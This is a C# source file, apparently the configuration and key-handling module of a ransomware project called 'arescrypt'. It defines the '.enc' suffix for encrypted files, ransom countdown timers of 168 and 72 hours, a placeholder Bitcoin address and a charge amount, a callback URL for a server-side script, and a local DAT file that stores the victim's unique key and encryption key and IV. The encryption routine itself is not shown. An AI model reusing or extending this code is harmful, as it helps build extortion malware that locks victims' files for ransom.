namespace arescrypt
{
    class Configuration
    {
        // User Specific
        public static string currentWorkingDirectory = System.IO.Path.GetDirectoryName(
            System.Reflection.Assembly.GetExecutingAssembly().Location);
        public static string sessionDomain = System.Environment.UserDomainName; // get current sessions domain
        public static string sessionUsername = System.Environment.UserName; // get current sessions username
        public static string userDomUser = sessionDomain + @"\" + sessionUsername;

        // Debugging configuration
        public bool sandBox = true; // Safemode for testing/debugging
        public string sandBoxDirectory = currentWorkingDirectory + @"\sandboxedDirectory";
        public bool debugMode = false; // Debug mode will enable/disable display of the Debug Console/GUI

        // Encryption/Decryption configuration
        public string encryptedFileSuffix = ".enc";

        // GUI Application configuration
        /* Timer application */
        public int lostTimer_Hours = 0xA8; public int lostTimer_Minutes = 0x0; public int lostTimer_Seconds = 0x0;
        public int riseTimer_Hours = 0x48; public int riseTimer_Minutes = 0x0; public int riseTimer_Seconds = 0x0;
        public string cryptoAddress = "<Example Bitcoin Address>"; // insert Bitcoin address here

        // Initial ammount to charge
        public static int amountToCharge = 0x1F4;

        // DAT file configuration
        public static string datFileLocation = currentWorkingDirectory + @"\arescrypt.dat";

        // Server Data
        public static string callbackURL = "http://localhost/arescrypt.php"; // just put the callback url hosting the addon API script
    }

    class UserData
    {
        public string uniqueKey { get; set; }
        public string encKey { get; set; }
        public string encIV { get; set; }

        public string getUniqueKey()
        {
            if (!System.IO.File.Exists(Configuration.datFileLocation))
            {
                this.uniqueKey = Cryptography.genRandomString(0xC); // 0xC = 12
                Miscellaneous.SetDATFileData(this);
            }
            else
            {
                UserData serveJSONData = Miscellaneous.GetDATFileData();
                this.uniqueKey = serveJSONData.uniqueKey;
            }
            return this.uniqueKey;
        }
    }
}
